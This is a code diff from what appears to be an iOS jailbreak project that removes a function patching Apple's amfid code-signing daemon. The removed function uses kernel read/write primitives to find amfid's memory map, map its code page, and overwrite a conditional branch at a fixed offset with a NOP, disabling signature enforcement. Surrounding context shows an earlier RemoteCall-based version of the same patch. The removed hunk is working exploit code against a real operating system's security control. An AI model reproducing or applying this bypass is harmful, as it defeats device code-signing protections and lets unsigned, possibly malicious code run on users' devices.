@@ -1,7 +1,6 @@
 #import "coretrust_bypass.h"
 #import "msm_trustcache.h"
 #import "../TaskRop/RemoteCall.h"
-#import "../TaskRop/VM.h"
 #import "../kexploit/kutils.h"
 #import "../kexploit/krw.h"
 #import "../kexploit/xpaci.h"
@@ -132,103 +131,9 @@ static char *write_test_binary(void)
 
 static bool g_amfid_nop_patched = false;
 
-#ifndef PAGE_SIZE
-#define PAGE_SIZE 16384
-#endif
-
-// On A18+ (SPTM), the RemoteCall exception-thread hijack of amfid panics.
-// Instead, directly find amfid's __TEXT via its vm_map and write the NOP
-// through a shared VM object mapping.
-static bool coretrust_amfid_nop_patch_direct(void)
-{
-    printf("[COREbreak] === Strategy 1v2: amfid NOP patch (direct vm_map) ===\n");
-
-    int amfidPid = find_pid_by_name("amfid");
-    if (amfidPid <= 0) {
-        printf("[COREbreak] amfid not found in allproc\n");
-        return false;
-    }
-    uint64_t procAddr = proc_find_by_name("amfid");
-    if (!procAddr || procAddr == (uint64_t)-1) {
-        printf("[COREbreak] proc_find_by_name failed\n");
-        return false;
-    }
-    uint64_t taskAddr = proc_task(procAddr);
-    if (!taskAddr || !is_kaddr_valid(taskAddr)) {
-        printf("[COREbreak] invalid task for amfid\n");
-        return false;
-    }
-    uint64_t vmMap = task_get_vm_map(taskAddr);
-    if (!vmMap || !is_kaddr_valid(vmMap)) {
-        printf("[COREbreak] invalid vm_map for amfid\n");
-        return false;
-    }
-    printf("[COREbreak] amfid task=%#llx vm_map=%#llx\n", taskAddr, vmMap);
-
-    // Walk vm_map entries looking for the cbz w22 instruction at offset 0x2ec8.
-    // We cannot use kread32 on user-space addresses (the krw primitives only
-    // read kernel virtual addresses). Instead, map each candidate page into
-    // our address space via vm_map_remote_page and check locally.
-    __block uint64_t foundBase = 0;
-    __block uint64_t mappedLocal = 0;
-    __block size_t mappedPageOffset = 0;
-    vm_map_iterate_entries(vmMap, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
-        if (start == 0 || end <= start || (end - start) < 0x3000) return;
-        uint64_t patchAddr = start + 0x2ec8;
-        uint64_t pageStart = patchAddr & ~((uint64_t)PAGE_SIZE - 1);
-        struct VMShmem shmem = vm_map_remote_page(vmMap, pageStart);
-        if (!shmem.used || !shmem.localAddress) return;
-        size_t pageOff = (size_t)(patchAddr - pageStart);
-        volatile uint32_t *candidate = (volatile uint32_t *)(uintptr_t)(shmem.localAddress + pageOff);
-        uint32_t instr = *candidate;
-        if ((instr & 0xFF00001F) == 0x34000016 || (instr & 0xFF00001F) == 0xB4000016) {
-            printf("[COREbreak] found cbz at 0x2ec8 in [%#llx-%#llx)\n", start, end);
-            foundBase = start;
-            mappedLocal = (uint64_t)shmem.localAddress;
-            mappedPageOffset = pageOff;
-            *stop = YES;
-        }
-    });
-    if (!foundBase) {
-        printf("[COREbreak] cbz at 0x2ec8 not found in any vm_map entry\n");
-        return false;
-    }
-    printf("[COREbreak] remote page mapped at local %#llx\n", mappedLocal);
-
-    // Verify the instruction before patching
-    volatile uint32_t *patchPtr = (volatile uint32_t *)(uintptr_t)(mappedLocal + mappedPageOffset);
-    uint32_t instr = *patchPtr;
-    bool isCbz = ((instr & 0xFF00001F) == 0x34000016 || (instr & 0xFF00001F) == 0xB4000016);
-    if (!isCbz) {
-        printf("[COREbreak] unexpected instr at local copy: 0x%08x\n", instr);
-        return false;
-    }
-    printf("[COREbreak] patching 0x%08x -> 0xD503201F at %p\n", instr, patchPtr);
-
-    *patchPtr = 0xD503201F;
-    sys_cache_control(kCacheFunctionPrepare, (void *)patchPtr, 4);
-
-    uint32_t verify = *patchPtr;
-    if (verify != 0xD503201F) {
-        printf("[COREbreak] verification failed: 0x%08x\n", verify);
-        return false;
-    }
-
-    printf("[COREbreak] ✅ amfid cbz NOP via direct vm_map\n");
-    return true;
-}
-
 bool coretrust_amfid_nop_patch(void)
 {
     printf("[COREbreak] === Strategy 1: amfid NOP patch ===\n");
-
-    // iOS 17+: RemoteCall's exception-thread hijack panics the kernel
-    // (amfid platform process + execption delivery changes).
-    // Use the direct vm_map approach instead.
-    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0")) {
-        printf("[COREbreak] iOS 17+: using direct vm_map patch\n");
-        return coretrust_amfid_nop_patch_direct();
-    }
 
     int amfidPid = find_pid_by_name("amfid");
     if (amfidPid <= 0) {
